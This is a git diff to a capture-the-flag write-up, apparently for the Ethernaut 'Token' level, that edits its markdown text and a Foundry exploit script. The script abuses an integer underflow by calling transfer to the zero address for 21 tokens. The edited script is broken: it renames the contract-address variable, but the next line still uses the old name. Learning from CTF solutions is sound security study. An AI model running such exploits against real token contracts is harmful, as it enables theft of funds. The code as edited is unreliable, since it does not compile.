@@ -1,4 +1,4 @@
-## Token
+## 👾 05. Token
 
 <br>
   
@@ -15,7 +15,7 @@
 <br>
 
 
-* in this challenge, we explore a classic vulnerability in both web2 and web3 security: integer overflows.
+* in this challenge, we explore a classic vulnerability in both web2 and web3 security: **integer overflows**.
 
 
 <br>
@@ -107,13 +107,13 @@ import {Token} from "src/05/Token.sol";
 
 contract Exploit is Script {
 
-        address levelInstance = 0x1e8407c9A9f3D689E8f48C63eaF04fe0bd549629;
+        address instance = vm.envAddress("INSTANCE_LEVEL5");
         Token level = Token(levelInstance);        
         
         function run() external {
 
             vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
-            level.transfer(0x0000000000000000000000000000000000000000, 21);
+            level.transfer(address(0), 21);
             vm.stopBroadcast();
     }
 }
